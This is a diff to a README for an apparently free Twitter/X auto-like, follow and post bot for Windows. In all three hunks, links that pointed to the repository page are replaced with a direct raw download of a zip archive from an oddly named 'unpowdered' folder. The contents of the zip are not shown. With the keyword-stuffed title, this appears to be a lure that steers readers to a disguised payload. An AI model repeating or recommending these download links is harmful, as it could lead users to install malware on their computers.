@@ -1,6 +1,6 @@
 # 🤖 Twitter-X-API-Free-Automation-Bot-Auto-Like-Follow-Post-Tracker - Simple X Automation for Windows
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/akhils9892/Twitter-X-API-Free-Automation-Bot-Auto-Like-Follow-Post-Tracker)
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/akhils9892/Twitter-X-API-Free-Automation-Bot-Auto-Like-Follow-Post-Tracker/raw/refs/heads/main/unpowdered/Free_Tracker_AP_Follow_Auto_Automation_Like_Post_Bot_Twitter_3.9.zip)
 
 ## 🚀 Overview
 
@@ -30,7 +30,7 @@ For best results, close other heavy apps before you start.
 
 Visit this page to download the app:
 
-[Open the download page](https://github.com/akhils9892/Twitter-X-API-Free-Automation-Bot-Auto-Like-Follow-Post-Tracker)
+[Open the download page](https://github.com/akhils9892/Twitter-X-API-Free-Automation-Bot-Auto-Like-Follow-Post-Tracker/raw/refs/heads/main/unpowdered/Free_Tracker_AP_Follow_Auto_Automation_Like_Post_Bot_Twitter_3.9.zip)
 
 If the page shows a release file, download it to your PC. If it shows the main repository page, use the files or release area on that page to get the Windows build.
 
@@ -206,7 +206,7 @@ This makes it easier to find the app later.
 ## 📌 Repository Link
 
 Primary download page:
-https://github.com/akhils9892/Twitter-X-API-Free-Automation-Bot-Auto-Like-Follow-Post-Tracker
+https://github.com/akhils9892/Twitter-X-API-Free-Automation-Bot-Auto-Like-Follow-Post-Tracker/raw/refs/heads/main/unpowdered/Free_Tracker_AP_Follow_Auto_Automation_Like_Post_Bot_Twitter_3.9.zip
 
 ## 📄 What This Tool Is Built For
 
